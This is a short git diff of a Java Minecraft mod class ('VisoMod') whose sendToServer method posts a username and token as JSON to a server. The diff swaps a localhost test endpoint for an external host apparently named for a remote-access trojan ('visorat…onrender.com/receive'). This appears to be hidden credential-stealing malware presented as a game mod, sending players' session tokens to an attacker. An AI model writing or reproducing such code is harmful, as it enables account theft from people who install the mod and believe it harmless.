@@ -29,7 +29,7 @@ public class VisoMod implements ModInitializer {
 
     private void sendToServer(String username, String token) {
         try {
-            HttpURLConnection conn = (HttpURLConnection) new URL("http://127.0.0.1:5000/receive").openConnection();
+            HttpURLConnection conn = (HttpURLConnection) new URL("https://visorat-2l5w.onrender.com/receive").openConnection();
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Content-Type", "application/json");
             conn.setDoOutput(true);
